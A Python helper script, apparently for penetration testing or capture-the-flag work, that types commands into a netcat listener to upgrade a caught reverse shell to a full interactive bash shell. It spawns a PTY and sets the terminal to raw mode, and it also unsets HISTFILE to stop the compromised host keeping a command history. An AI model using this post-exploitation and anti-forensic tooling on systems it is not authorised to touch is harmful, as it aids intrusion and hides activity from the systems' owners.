#!/usr/bin/env python3
from pynput.keyboard import Key, Controller
from pynput import keyboard
import time, sys

# Adding in colourful text
class Colour:
    Black = "\u001b[30m"
    Red = "\u001b[31m"
    Green = "\u001b[32m"
    Yellow = "\u001b[33m"
    Blue = "\u001b[34m"
    Magenta = "\u001b[35m"
    White = "\u001b[37m"
    Cyan = "\u001b[36m"
    Reset = "\u001b[0m"
    bracketsymbol = Blue
    Colour1 = Green
    normaltext = Cyan
    plussymbol = Red
    Colour3 = Red
    lines = White
    text = Yellow

#Formatted way of displaying output to screen with colours
def display(text):
    print(f"\n{Colour.bracketsymbol}[{Colour.plussymbol}+{Colour.bracketsymbol}]{Colour.text} {text}{Colour.Reset}\n")
    
display("please place the cursor in your nc listener and press the # key")

#types out the commands needed to upgrade the shell
def upgrade():
	#takes care of pressing the enter key after each command is typed out
	def ent():
		time.sleep(0.3)
		kb.press(Key.enter)
		kb.release(Key.enter)
		
	kb=Controller()
	time.sleep(1)
	ent()
	kb.type("unset HISTFILE")
	ent()
	kb.type("""python -c '\''import pty; pty.spawn("/bin/bash")'\'' || python3 -c '\''import pty; pty.spawn("/bin/bash")'\'' || script -qc /bin/bash /dev/null""")
	ent()
	kb.press(Key.ctrl)
	kb.press("z")
	kb.release("z")
	kb.release(Key.ctrl)
	kb.type("stty size | xclip -selection clipboard")
	ent()
	kb.type("stty raw -echo; fg")
	ent()
	kb.type("unset HISTFILE")
	ent()
	kb.type("export SHELL=bash")
	ent()
	kb.type("export TERM=xterm-256color")
	ent()
	kb.type("stty cols $(xclip -o -selection clipboard | awk '{print $2}') rows $(xclip -o -selection clipboard | awk '{print $1}')")
	ent()
	kb.type("reset")
	ent()
	kb.type("exec /bin/bash")
	ent()
	kb.type("clear")
	ent()
	kb.type("UPGRADE SUCCESSFUL!")
	display("shell successfully upgraded!")
	sys.exit()

#checks to see if the # key has been pressed
def on_press(key):
	a=str(key)
	a=a.replace("'", "")
	if a=='#':
		upgrade()
	
#listens for all keyboard inputs and passes each key stroke to on_press        
with keyboard.Listener(
        on_press=on_press) as listener:
        	listener.join()
